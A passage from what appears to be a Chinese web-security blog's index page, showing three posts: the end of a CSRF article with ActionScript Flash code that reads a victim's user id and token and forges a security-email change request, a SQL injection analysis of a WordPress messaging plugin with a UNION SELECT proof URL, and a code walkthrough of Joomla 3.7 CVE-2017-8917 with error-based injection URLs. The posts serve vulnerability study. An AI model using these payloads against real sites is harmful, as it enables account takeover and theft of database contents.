import flash.net.*;</span><br><span class="line">    import flash.text.TextField;</span><br><span class="line">    public class url extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function url()</span><br><span class="line">        &#123;</span><br><span class="line">            //获取当前页面userid/token</span><br><span class="line">            var echo_txt:TextField = new TextField();</span><br><span class="line">            var targetURL:String = &quot;http://xx.xx.cc&quot;;</span><br><span class="line">            var request:URLRequest = new URLRequest(targetURL);</span><br><span class="line">            request.method = URLRequestMethod.GET;</span><br><span class="line">            request.data = &quot;&quot;;</span><br><span class="line">            sendToURL(request);</span><br><span class="line">            var loader:URLLoader=new URLLoader();</span><br><span class="line">            loader.addEventListener(Event.COMPLETE,completeHandler);</span><br><span class="line">            function completeHandler(event:Event):void&#123;</span><br><span class="line">            var userid:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?xxid=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];</span><br><span class="line"></span><br><span class="line"> var masthash:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?masthash=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];</span><br><span class="line">            echo_txt.text =  masthash;</span><br><span class="line">            //伪造申请密保邮箱POST请求</span><br><span class="line">            var emailtargetURL:String = &quot;http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send&quot;;</span><br><span class="line">            var emailrequest:URLRequest = new URLRequest(emailtargetURL);</span><br><span class="line">            emailrequest.method = URLRequestMethod.POST;</span><br><span class="line">            var postdata:Object = new Array();</span><br><span class="line">            postdata[0]=&quot;xxxx=xxxx@xxx.cc&amp;xxxx=&quot;+xxxxx&amp;&quot;xxxxx=&quot;+xxx;</span><br><span class="line">            emailrequest.data = postdata[0];</span><br><span class="line">            sendToURL(emailrequest);</span><br><span class="line">            &#125;</span><br><span class="line">            loader.load(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在可以注册一个新邮箱测试一下了</p>
<p>[来源wooyun]</p>
<h3 id="0x04-CSRF的防御"><a href="#0x04-CSRF的防御" class="headerlink" title="0x04 CSRF的防御"></a>0x04 CSRF的防御</h3><p>token校验</p>
<h3 id="0x05-CSRF总结"><a href="#0x05-CSRF总结" class="headerlink" title="0x05 CSRF总结"></a>0x05 CSRF总结</h3><p>只要够猥琐，一个小洞也能上天</p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Nov 01 2016 21:00:00 GMT+0800">2016-11-01</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/CSRF/">CSRF</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Cross-site%20request%20forgery/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Wordpress_Plugin_SinglePersonalMessage1.0.3%20sql%20injection/">
                        Wordpress_Plugin_SinglePersonalMessage1.0.3 sql injection
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        exploit-db
12345678910# Exploit Title: Single Personal Message 1.0.3 – Plugin WordPress – Sql Injection# Date: 28/11/2016# Exploit Author: Lenon Leite# Vendor Homepage: https://wordpress.org/plugins/simple-personal-message/# Software Link: https://wordpress.org/plugins/simple-personal-message/# Contact: http://twitter.com/lenonleite# Website: http://lenonleite.com.br/# Category: webapps# Version: 1.0.3# Tested on: Windows 8

0X01 代码分析好不容易从github上找了份有漏洞的版本
目录结构如图

既然是注入就从交互点下手，搜索sql语句，顺着目录挨个寻找
从外到内寻找交互的地方，在admin/class-simple-personal-message-admin.php发现了几十处,例如下面这种
123456789$user_login = esc_sql(wp_get_current_user()-&gt;user_login);global $wpdb;$table_name = $wpdb-&gt;prefix . &#x27;spm_message&#x27;;$wpdb-&gt;get_results(&quot;SELECT * FROM $table_name WHERE receiver = &#x27;&quot; . $user_login . &quot;&#x27; AND status = 0 AND receiver_deleted = 0&quot;, OBJECT);return $wpdb-&gt;num_rows;
然而这个里面所有的都用esc_sql过滤了
继续往里层查找，在admin/partials/simple-personal-message-admin-view.php发现
12345678910111213&lt;?phpglobal $wpdb;$table = $wpdb-&gt;prefix . &#x27;spm_message&#x27;;$id = esc_attr($_GET[&#x27;message&#x27;]);$message = $wpdb-&gt;get_results(&quot;SELECT * FROM $table WHERE id = $id&quot;);$user = get_user_by(&#x27;login&#x27;, $message[0]-&gt;sender);?&gt;

可以很明显的看到
123$id = esc_attr($_GET[&#x27;message&#x27;]);$message = $wpdb-&gt;get_results(&quot;SELECT * FROM $table WHERE id = $id&quot;);
message没有经过过滤就拼接到sql语句中了
0x02 证明正常状态下

拼接一下message参数
http://localhost/wordpress/wp-admin/admin.php?page=simple-personal-message-outbox&amp;action=view&amp;message=1%20UNION%20SELECT%201,2.3,4,5,user(),7,8,9,10,11,12%20FROM%20wp_terms%20WHERE%20term_id=1


                    
                </div> -->
                <div class="article-content markdown-body">
                    <p><a class="link" target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40870/">exploit-db<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Single Personal Message 1.0.3 – Plugin WordPress – Sql Injection</span><br><span class="line"># Date: 28/11/2016</span><br><span class="line"># Exploit Author: Lenon Leite</span><br><span class="line"># Vendor Homepage: https://wordpress.org/plugins/simple-personal-message/</span><br><span class="line"># Software Link: https://wordpress.org/plugins/simple-personal-message/</span><br><span class="line"># Contact: http://twitter.com/lenonleite</span><br><span class="line"># Website: http://lenonleite.com.br/</span><br><span class="line"># Category: webapps</span><br><span class="line"># Version: 1.0.3</span><br><span class="line"># Tested on: Windows 8</span><br></pre></td></tr></table></figure>

<h3 id="0X01-代码分析"><a href="#0X01-代码分析" class="headerlink" title="0X01 代码分析"></a>0X01 代码分析</h3><p>好不容易从github上找了份有漏洞的版本</p>
<p>目录结构如图</p>
<p><img lazyload src="/images/loading.svg" data-src="15190488223501.png"></p>
<p>既然是注入就从交互点下手，搜索sql语句，顺着目录挨个寻找</p>
<p>从外到内寻找交互的地方，在<code>admin/class-simple-personal-message-admin.php</code>发现了几十处,例如下面这种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$user_login = esc_sql(wp_get_current_user()-&gt;user_login);</span><br><span class="line"></span><br><span class="line">global $wpdb;</span><br><span class="line"></span><br><span class="line">$table_name = $wpdb-&gt;prefix . &#x27;spm_message&#x27;;</span><br><span class="line"></span><br><span class="line">$wpdb-&gt;get_results(&quot;SELECT * FROM $table_name WHERE receiver = &#x27;&quot; . $user_login . &quot;&#x27; AND status = 0 AND receiver_deleted = 0&quot;, OBJECT);</span><br><span class="line"></span><br><span class="line">return $wpdb-&gt;num_rows;</span><br></pre></td></tr></table></figure>
<p>然而这个里面所有的都用<code>esc_sql</code>过滤了</p>
<p>继续往里层查找，在<code>admin/partials/simple-personal-message-admin-view.php</code>发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">global $wpdb;</span><br><span class="line"></span><br><span class="line">$table = $wpdb-&gt;prefix . &#x27;spm_message&#x27;;</span><br><span class="line"></span><br><span class="line">$id = esc_attr($_GET[&#x27;message&#x27;]);</span><br><span class="line"></span><br><span class="line">$message = $wpdb-&gt;get_results(&quot;SELECT * FROM $table WHERE id = $id&quot;);</span><br><span class="line"></span><br><span class="line">$user = get_user_by(&#x27;login&#x27;, $message[0]-&gt;sender);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以很明显的看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = esc_attr($_GET[&#x27;message&#x27;]);</span><br><span class="line"></span><br><span class="line">$message = $wpdb-&gt;get_results(&quot;SELECT * FROM $table WHERE id = $id&quot;);</span><br></pre></td></tr></table></figure>
<p><code>message</code>没有经过过滤就拼接到sql语句中了</p>
<h3 id="0x02-证明"><a href="#0x02-证明" class="headerlink" title="0x02 证明"></a>0x02 证明</h3><p>正常状态下</p>
<p><img lazyload src="/images/loading.svg" data-src="15190488344998.png"></p>
<p>拼接一下<code>message</code>参数</p>
<p><code>http://localhost/wordpress/wp-admin/admin.php?page=simple-personal-message-outbox&amp;action=view&amp;message=1%20UNION%20SELECT%201,2.3,4,5,user(),7,8,9,10,11,12%20FROM%20wp_terms%20WHERE%20term_id=1</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15190488410584.png"></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Thu Oct 27 2016 21:00:00 GMT+0800">2016-10-27</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/PHP/">PHP</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Wordpress_Plugin_SinglePersonalMessage1.0.3%20sql%20injection/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Joomla!%203.7%20(CVE-2017-8917)%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">
                        Joomla! 3.7 (CVE-2017-8917) 代码分析
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        0x00 背景1234Security Risk: SevereExploitation Level: Easy/RemoteDREAD Score: 8.6/10Vulnerability: SQL Injection



0x01 POC123http://127.0.0.1/Joomla_16/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(1,concat(0x7e,(select%20user()),0x7e))http://127.0.0.1/Joomla_16/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)

0x02 分析MVC架构，根据poc往下扒
CVE-2017-8917_Joomla_3.7.0\components\com_fields\controller.php
12345678910111213141516171819public function __construct($config = array())	&#123;		$this-&gt;input = JFactory::getApplication()-&gt;input;		// Frontpage Editor Fields Button proxying:		if ($this-&gt;input-&gt;get(&#x27;view&#x27;) === &#x27;fields&#x27; &amp;&amp; $this-&gt;input-&gt;get(&#x27;layout&#x27;) === &#x27;modal&#x27;)                在这里找到了poc中的fields和modal，顺着这里继续往下		&#123;			// Load the backend language file.			$lang = JFactory::getLanguage();			$lang-&gt;load(&#x27;com_fields&#x27;, JPATH_ADMINISTRATOR);			$config[&#x27;base_path&#x27;] = JPATH_COMPONENT_ADMINISTRATOR;                        设置$config[&#x27;base_path&#x27;]为administrator的components目录		&#125;		parent::__construct($config);	&#125;

然后跟踪这个函数到了CVE-2017-8917_Joomla_3.7.0\libraries\legacy\controller\legacy.php
123456789101112131415161718public function __construct($config = array())&#123; .......              // Set the default model search path		if (array_key_exists(&#x27;model_path&#x27;, $config))		&#123;			// User-defined dirs			$this-&gt;addModelPath($config[&#x27;model_path&#x27;], $this-&gt;model_prefix);		&#125;		else		&#123;			$this-&gt;addModelPath($this-&gt;basePath . &#x27;/models&#x27;, $this-&gt;model_prefix);                       进入else分支，$this-&gt;basePath是上一段中$config[&#x27;base_path&#x27;]，即 administators/components		&#125;..........&#125;

继续往下走
1234567891011121314151617181920public function display($cachable = false, $urlparams = array())此处进行了一个实际操作，获取view、创建model等	&#123;		$document = JFactory::getDocument();		$viewType = $document-&gt;getType();		$viewName = $this-&gt;input-&gt;get(&#x27;view&#x27;, $this-&gt;default_view);		$viewLayout = $this-&gt;input-&gt;get(&#x27;layout&#x27;, &#x27;default&#x27;, &#x27;string&#x27;);		$view = $this-&gt;getView($viewName, $viewType, &#x27;&#x27;, array(&#x27;base_path&#x27; =&gt; $this-&gt;basePath, &#x27;layout&#x27; =&gt; $viewLayout));		// Get/Create the model		if ($model = $this-&gt;getModel($viewName))              此处 getModel进行了一个操作，跟进		&#123;			// Push the model into the view (as default)			$view-&gt;setModel($model, true);		&#125;		$view-&gt;document = $document;

1234567891011121314151617181920212223242526272829303132333435public function getModel($name = &#x27;&#x27;, $prefix = &#x27;&#x27;, $config = array())&#123;	if (empty($name))	&#123;		$name = $this-&gt;getName();	&#125;	if (empty($prefix))	&#123;		$prefix = $this-&gt;model_prefix;	&#125;	if ($model = $this-&gt;createModel($name, $prefix, $config))               调用createModel方法进行类的实例化并返回$model	&#123;		// Task is a reserved state		$model-&gt;setState(&#x27;task&#x27;, $this-&gt;task);		// Let&#x27;s get the application object and set menu information if it&#x27;s available		$menu = JFactory::getApplication()-&gt;getMenu();		if (is_object($menu))		&#123;			if ($item = $menu-&gt;getActive())			&#123;				$params = $menu-&gt;getParams($item-&gt;id);				// Set default state data				$model-&gt;setState(&#x27;parameters.menu&#x27;, $params);			&#125;		&#125;	&#125;	return $model;&#125;
然后接下来setModel将model Push到view中
123456// Get/Create the modelif ($model = $this-&gt;getModel($viewName))&#123;	// Push the model into the view (as default)	$view-&gt;setModel($model, true);&#125;
12345678910111213141516171819202122232425262728293031323334353637383940414243444546	// Display the view	if ($cachable &amp;&amp; $viewType != &#x27;feed&#x27; &amp;&amp; JFactory::getConfig()-&gt;get(&#x27;caching&#x27;) &gt;= 1)	&#123;		$option = $this-&gt;input-&gt;get(&#x27;option&#x27;);		if (is_array($urlparams))		&#123;			$app = JFactory::getApplication();			if (!empty($app-&gt;registeredurlparams))			&#123;				$registeredurlparams = $app-&gt;registeredurlparams;			&#125;			else			&#123;				$registeredurlparams = new stdClass;			&#125;			foreach ($urlparams as $key =&gt; $value)			&#123;				// Add your safe URL parameters with variable type as value &#123;@see JFilterInput::clean()&#125;.				$registeredurlparams-&gt;$key = $value;			&#125;			$app-&gt;registeredurlparams = $registeredurlparams;		&#125;		try		&#123;			/** @var JCacheControllerView $cache */			$cache = JFactory::getCache($option, &#x27;view&#x27;);			$cache-&gt;get($view, &#x27;display&#x27;);		&#125;		catch (JCacheException $exception)		&#123;			$view-&gt;display();		&#125;	&#125;	else	&#123;		$view-&gt;display();                       调用视图的display函数	&#125;	return $this;&#125;

跳转到视图的display函数中CVE-2017-8917_Joomla_3.7.0\administrator\components\com_fields\views\fields\view.html.php
123456789101112131415161718	public function display($tpl = null)	&#123;		$this-&gt;state         = $this-&gt;get(&#x27;State&#x27;);                此处调用了get函数		$this-&gt;items         = $this-&gt;get(&#x27;Items&#x27;);		$this-&gt;pagination    = $this-&gt;get(&#x27;Pagination&#x27;);		$this-&gt;filterForm    = $this-&gt;get(&#x27;FilterForm&#x27;);		$this-&gt;activeFilters = $this-&gt;get(&#x27;ActiveFilters&#x27;);		// Check for errors.		if (count($errors = $this-&gt;get(&#x27;Errors&#x27;)))		&#123;			JError::raiseError(500, implode(&quot;\n&quot;, $errors));			return false;		&#125;......&#125;
跟进上一段中的get函数CVE-2017-8917_Joomla_3.7.0\libraries\legacy\view\legacy.php
12345678910111213141516171819202122232425262728293031323334public function get($property, $default = null)&#123;	// If $model is null we use the default model	if (is_null($default))	&#123;		$model = $this-&gt;_defaultModel;	&#125;	else	&#123;		$model = strtolower($default);	&#125;	// First check to make sure the model requested exists	if (isset($this-&gt;_models[$model]))	&#123;		// Model exists, let&#x27;s build the method name		$method = &#x27;get&#x27; . ucfirst($property);                       $property是我们传进的实参也就是&#x27;State&#x27;,那么拼接起来后的方法名就是getState,然后调用这个方法		// Does the method exist?		if (method_exists($this-&gt;_models[$model], $method))		&#123;			// The method exists, let&#x27;s call it and return what we get			$result = $this-&gt;_models[$model]-&gt;$method();			return $result;		&#125;	&#125;	// Degrade to JObject::get	$result = parent::get($property, $default);	return $result;&#125;

接下来跟踪getState，CVE-2017-8917_Joomla_3.7.0\libraries\legacy\model\legacy.php
12345678910111213public function getState($property = null, $default = null)	&#123;		if (!$this-&gt;__state_set)		&#123;			// Protected method to auto-populate the model state.			$this-&gt;populateState();                         调用populateState函数			// Set the model state set flag to true.			$this-&gt;__state_set = true;		&#125;		return $property === null ? $this-&gt;state : $this-&gt;state-&gt;get($property, $default);	&#125;
追踪populateState函数CVE-2017-8917_Joomla_3.7.0\administrator\components\com_fields\models\fields.php
123456789101112131415161718protected function populateState($ordering = null, $direction = null)	&#123;		// List state information.		parent::populateState(&#x27;a.ordering&#x27;, &#x27;asc&#x27;);                调用了父类populateState方法		$context = $this-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.context&#x27;, &#x27;context&#x27;, &#x27;com_content.article&#x27;, &#x27;CMD&#x27;);		$this-&gt;setState(&#x27;filter.context&#x27;, $context);		// Split context into component and optional section		$parts = FieldsHelper::extract($context);		if ($parts)		&#123;			$this-&gt;setState(&#x27;filter.component&#x27;, $parts[0]);			$this-&gt;setState(&#x27;filter.section&#x27;, $parts[1]);		&#125;	&#125;

跟踪到父类CVE-2017-8917_Joomla_3.7.0\libraries\legacy\model\list.php
1234567891011121314151617181920212223// Receive &amp; set list optionsif ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.list&#x27;, &#x27;list&#x27;, array(), &#x27;array&#x27;))&#123;	foreach ($list as $name =&gt; $value)	&#123;		// Exclude if blacklisted		if (!in_array($name, $this-&gt;listBlacklist))		&#123;			// Extra validations			switch ($name)			&#123;				case &#x27;fullordering&#x27;:					$orderingParts = explode(&#x27; &#x27;, $value);					if (count($orderingParts) &gt;= 2)					&#123;						// Latest part will be considered the direction						$fullDirection = end($orderingParts);						if (in_array(strtoupper($fullDirection), array(&#x27;ASC&#x27;, &#x27;DESC&#x27;, &#x27;&#x27;)))						&#123;							$this-&gt;setState(&#x27;list.direction&#x27;, $fullDirection);						&#125;
取了个list的值进来赋值给了$list$list遍历出来，接着switch 键值
switch完成后
1$this-&gt;setState(&#x27;list.&#x27; . $name, $value);
通过这个可以设置list.fullordering设置后，下一步就要考虑如何取出来
在视图文件中的display方法中，利用get(‘State’)来调用了getState方法。紧跟着这个操作的下一行，就有一个get(‘Item’)
1234public function display($tpl = null)    &#123;        $this-&gt;state         = $this-&gt;get(&#x27;State&#x27;);        $this-&gt;items         = $this-&gt;get(&#x27;Items&#x27;);
跟踪getItems函数
12345678910111213141516171819202122232425public function getItems()&#123;	// Get a storage key.	$store = $this-&gt;getStoreId();	// Try to load the data from internal storage.	if (isset($this-&gt;cache[$store]))	&#123;		return $this-&gt;cache[$store];	&#125;	try	&#123;		// Load the list items and add the items to the internal cache.		$this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState(&#x27;list.limit&#x27;));调用了一个_getListQuery方法	&#125;	catch (RuntimeException $e)	&#123;		$this-&gt;setError($e-&gt;getMessage());		return false;	&#125;	return $this-&gt;cache[$store];&#125;
跟踪_getListQuery函数
1234567891011121314151617protected function _getListQuery()&#123;	// Capture the last store id used.	static $lastStore...
                    
                </div> -->
                <div class="article-content markdown-body">
                    <h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Security Risk: Severe</span><br><span class="line">Exploitation Level: Easy/Remote</span><br><span class="line">DREAD Score: 8.6/10</span><br><span class="line">Vulnerability: SQL Injection</span><br></pre></td></tr></table></figure>



<h3 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Joomla_16/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(1,concat(0x7e,(select%20user()),0x7e))</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/Joomla_16/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</span><br></pre></td></tr></table></figure>

<h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>MVC架构，根据poc往下扒</p>
<p><code>CVE-2017-8917_Joomla_3.7.0\components\com_fields\controller.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($config = array())</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;input = JFactory::getApplication()-&gt;input;</span><br><span class="line"></span><br><span class="line">		// Frontpage Editor Fields Button proxying:</span><br><span class="line">		if ($this-&gt;input-&gt;get(&#x27;view&#x27;) === &#x27;fields&#x27; &amp;&amp; $this-&gt;input-&gt;get(&#x27;layout&#x27;) === &#x27;modal&#x27;)</span><br><span class="line">                在这里找到了poc中的fields和modal，顺着这里继续往下</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			// Load the backend language file.</span><br><span class="line">			$lang = JFactory::getLanguage();</span><br><span class="line">			$lang-&gt;load(&#x27;com_fields&#x27;, JPATH_ADMINISTRATOR);</span><br><span class="line"></span><br><span class="line">			$config[&#x27;base_path&#x27;] = JPATH_COMPONENT_ADMINISTRATOR;</span><br><span class="line">                        设置$config[&#x27;base_path&#x27;]为administrator的components目录</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		parent::__construct($config);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>然后跟踪这个函数到了<code>CVE-2017-8917_Joomla_3.7.0\libraries\legacy\controller\legacy.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($config = array())</span><br><span class="line">&#123;</span><br><span class="line"> .......</span><br><span class="line">              // Set the default model search path</span><br><span class="line">		if (array_key_exists(&#x27;model_path&#x27;, $config))</span><br><span class="line">		&#123;</span><br><span class="line">			// User-defined dirs</span><br><span class="line">			$this-&gt;addModelPath($config[&#x27;model_path&#x27;], $this-&gt;model_prefix);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$this-&gt;addModelPath($this-&gt;basePath . &#x27;/models&#x27;, $this-&gt;model_prefix);</span><br><span class="line"></span><br><span class="line">                       进入else分支，$this-&gt;basePath是上一段中$config[&#x27;base_path&#x27;]，即 administators/components</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续往下走</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function display($cachable = false, $urlparams = array())</span><br><span class="line">此处进行了一个实际操作，获取view、创建model等</span><br><span class="line">	&#123;</span><br><span class="line">		$document = JFactory::getDocument();</span><br><span class="line">		$viewType = $document-&gt;getType();</span><br><span class="line">		$viewName = $this-&gt;input-&gt;get(&#x27;view&#x27;, $this-&gt;default_view);</span><br><span class="line">		$viewLayout = $this-&gt;input-&gt;get(&#x27;layout&#x27;, &#x27;default&#x27;, &#x27;string&#x27;);</span><br><span class="line"></span><br><span class="line">		$view = $this-&gt;getView($viewName, $viewType, &#x27;&#x27;, array(&#x27;base_path&#x27; =&gt; $this-&gt;basePath, &#x27;layout&#x27; =&gt; $viewLayout));</span><br><span class="line"></span><br><span class="line">		// Get/Create the model</span><br><span class="line">		if ($model = $this-&gt;getModel($viewName))</span><br><span class="line">              此处 getModel进行了一个操作，跟进</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			// Push the model into the view (as default)</span><br><span class="line">			$view-&gt;setModel($model, true);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$view-&gt;document = $document;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public function getModel($name = &#x27;&#x27;, $prefix = &#x27;&#x27;, $config = array())</span><br><span class="line">&#123;</span><br><span class="line">	if (empty($name))</span><br><span class="line">	&#123;</span><br><span class="line">		$name = $this-&gt;getName();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (empty($prefix))</span><br><span class="line">	&#123;</span><br><span class="line">		$prefix = $this-&gt;model_prefix;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ($model = $this-&gt;createModel($name, $prefix, $config))</span><br><span class="line">               调用createModel方法进行类的实例化并返回$model</span><br><span class="line">	&#123;</span><br><span class="line">		// Task is a reserved state</span><br><span class="line">		$model-&gt;setState(&#x27;task&#x27;, $this-&gt;task);</span><br><span class="line"></span><br><span class="line">		// Let&#x27;s get the application object and set menu information if it&#x27;s available</span><br><span class="line">		$menu = JFactory::getApplication()-&gt;getMenu();</span><br><span class="line"></span><br><span class="line">		if (is_object($menu))</span><br><span class="line">		&#123;</span><br><span class="line">			if ($item = $menu-&gt;getActive())</span><br><span class="line">			&#123;</span><br><span class="line">				$params = $menu-&gt;getParams($item-&gt;id);</span><br><span class="line"></span><br><span class="line">				// Set default state data</span><br><span class="line">				$model-&gt;setState(&#x27;parameters.menu&#x27;, $params);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return $model;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后接下来setModel将model Push到view中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Get/Create the model</span><br><span class="line">if ($model = $this-&gt;getModel($viewName))</span><br><span class="line">&#123;</span><br><span class="line">	// Push the model into the view (as default)</span><br><span class="line">	$view-&gt;setModel($model, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
